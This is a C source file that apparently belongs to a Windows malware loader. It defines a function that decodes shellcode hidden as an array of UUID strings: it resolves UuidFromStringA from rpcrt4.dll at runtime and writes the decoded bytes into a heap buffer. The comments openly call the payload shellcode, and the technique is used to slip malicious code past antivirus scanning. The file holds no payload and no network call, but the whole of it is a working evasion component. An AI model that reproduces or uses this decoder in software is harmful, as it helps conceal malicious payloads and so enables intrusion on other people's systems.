#include "encoders.h"


typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
        RPC_CSTR        StringUuid,
        UUID*           Uuid
);


BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {   
        PBYTE           pBuffer         = NULL, TmpBuffer       = NULL;
        SIZE_T          sBuffSize       = 0;
        PCSTR           Terminator      = NULL;
        NTSTATUS        STATUS          = STATUS_SUCCESS;
        
        // getting UuidFromStringA   address from Rpcrt4.dll
#ifdef UNICODE
        fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(L"rpcrt4.dll"), "UuidFromStringA");
#else
        fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary("rpcrt4.dll"), "UuidFromStringA");
#endif
        if (pUuidFromStringA == NULL) {
                DebugPrint("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
        sBuffSize = NmbrOfElements * 16;
        // allocating mem, that will hold the deobfuscated shellcode
        pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
        if (pBuffer == NULL) {
                DebugPrint("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // setting TmpBuffer to be equal to pBuffer
        TmpBuffer = pBuffer;
        
        
        // loop through all the addresses saved in Ipv6Array
        for (int i = 0; i < NmbrOfElements; i++) {
                // UuidArray[i] is a single UUid address from the array UuidArray
                if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
                        // if failed ...
                        DebugPrint("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
                        return FALSE;
                }
                
                // tmp buffer will be used to point to where to write next (in the newly allocated memory)
                TmpBuffer = (PBYTE)(TmpBuffer + 16);
        }
        
        *ppDAddress = pBuffer;
        *pDSize = sBuffSize;
        return TRUE;
}
